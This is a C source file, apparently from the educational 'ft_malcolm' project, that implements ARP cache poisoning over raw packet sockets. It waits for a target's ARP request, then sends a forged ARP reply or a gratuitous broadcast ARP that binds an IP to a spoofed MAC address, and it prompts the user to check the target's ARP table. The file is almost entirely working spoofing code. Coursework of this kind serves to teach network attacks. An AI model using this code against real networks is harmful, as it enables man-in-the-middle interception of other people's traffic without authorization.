#include "ft_malcolm.h"

static int	is_matching_request(t_arp_packet *pkt, t_malcolm *ctx)
{
	static const uint8_t	bcast[MAC_LEN] = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	if (ft_memcmp(pkt->eth.dest, bcast, MAC_LEN) != 0)
		return (0);
	if (ntohs(pkt->arp.opcode) != ARP_OP_REQUEST)
		return (0);
	if (ft_memcmp(pkt->arp.target_ip, ctx->source_ip, IPV4_LEN) != 0)
		return (0);
	if (ft_memcmp(pkt->arp.sender_ip, ctx->target_ip, IPV4_LEN) != 0)
		return (0);
	return (1);
}

static void	print_request_info(t_arp_packet *pkt)
{
	printf("An ARP request has been broadcast.\n");
	printf("    mac address of request: ");
	print_mac(pkt->arp.sender_mac);
	printf("\n    IP address of request: ");
	print_ip(pkt->arp.sender_ip);
	printf("\n");
}

int	listen_arp_request(t_malcolm *ctx)
{
	unsigned char	buf[4096];
	ssize_t			len;
	t_arp_packet	*pkt;

	while (g_running)
	{
		len = recvfrom(ctx->sockfd, buf, sizeof(buf), 0, NULL, NULL);
		if (len < 0)
		{
			if (errno == EINTR)
				continue;
			fprintf(stderr, "%s: recvfrom: %s\n", PROGRAM_NAME,
				strerror(errno));
			return (-1);
		}
		if ((size_t)len < sizeof(t_arp_packet))
			continue;
		pkt = (t_arp_packet *)buf;
		if (ctx->verbose)
			print_verbose_pkt(pkt, (size_t)len, 0);
		if (!is_matching_request(pkt, ctx))
			continue;
		print_request_info(pkt);
		return (0);
	}
	return (-1);
}

static void	build_arp_reply(t_arp_packet *pkt, t_malcolm *ctx)
{
	ft_memcpy(pkt->eth.dest, ctx->target_mac, MAC_LEN);
	ft_memcpy(pkt->eth.src, ctx->source_mac, MAC_LEN);
	pkt->eth.ethertype = htons(ETH_P_ARP);
	pkt->arp.hw_type = htons(ARP_HW_ETHER);
	pkt->arp.proto_type = htons(ARP_PROTO_IPV4);
	pkt->arp.hw_len = MAC_LEN;
	pkt->arp.proto_len = IPV4_LEN;
	pkt->arp.opcode = htons(ARP_OP_REPLY);
	ft_memcpy(pkt->arp.sender_mac, ctx->source_mac, MAC_LEN);
	ft_memcpy(pkt->arp.sender_ip, ctx->source_ip, IPV4_LEN);
	ft_memcpy(pkt->arp.target_mac, ctx->target_mac, MAC_LEN);
	ft_memcpy(pkt->arp.target_ip, ctx->target_ip, IPV4_LEN);
}

static int	do_send(t_malcolm *ctx, t_arp_packet *pkt)
{
	struct sockaddr_ll	sll;

	ft_bzero(&sll, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ctx->iface_index;
	sll.sll_halen = MAC_LEN;
	ft_memcpy(sll.sll_addr, pkt->eth.dest, MAC_LEN);
	if (sendto(ctx->sockfd, pkt, sizeof(*pkt), 0,
			(struct sockaddr *)&sll, sizeof(sll)) < 0)
	{
		fprintf(stderr, "%s: sendto: %s\n", PROGRAM_NAME, strerror(errno));
		return (-1);
	}
	return (0);
}

int	send_gratuitous_arp(t_malcolm *ctx)
{
	static const uint8_t	bcast[MAC_LEN] = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};
	t_arp_packet			pkt;

	printf("Sending gratuitous ARP for ");
	print_ip(ctx->source_ip);
	printf(" with mac ");
	print_mac(ctx->source_mac);
	printf("...\n");
	ft_bzero(&pkt, sizeof(pkt));
	ft_memcpy(pkt.eth.dest, bcast, MAC_LEN);
	ft_memcpy(pkt.eth.src, ctx->source_mac, MAC_LEN);
	pkt.eth.ethertype = htons(ETH_P_ARP);
	pkt.arp.hw_type = htons(ARP_HW_ETHER);
	pkt.arp.proto_type = htons(ARP_PROTO_IPV4);
	pkt.arp.hw_len = MAC_LEN;
	pkt.arp.proto_len = IPV4_LEN;
	pkt.arp.opcode = htons(ARP_OP_REPLY);
	ft_memcpy(pkt.arp.sender_mac, ctx->source_mac, MAC_LEN);
	ft_memcpy(pkt.arp.sender_ip, ctx->source_ip, IPV4_LEN);
	ft_memcpy(pkt.arp.target_mac, bcast, MAC_LEN);
	ft_memcpy(pkt.arp.target_ip, ctx->source_ip, IPV4_LEN);
	if (ctx->verbose)
		print_verbose_pkt(&pkt, sizeof(pkt), 1);
	if (do_send(ctx, &pkt) != 0)
		return (-1);
	printf("Gratuitous ARP sent.\nExiting program...\n");
	return (0);
}

int	send_arp_reply(t_malcolm *ctx)
{
	t_arp_packet	pkt;

	printf("Now sending an ARP reply to the target address "
		"with spoofed source, please wait...\n");
	ft_bzero(&pkt, sizeof(pkt));
	build_arp_reply(&pkt, ctx);
	if (ctx->verbose)
		print_verbose_pkt(&pkt, sizeof(pkt), 1);
	if (do_send(ctx, &pkt) != 0)
		return (-1);
	printf("Sent an ARP reply packet, you may now check "
		"the arp table on the target.\n");
	return (0);
}
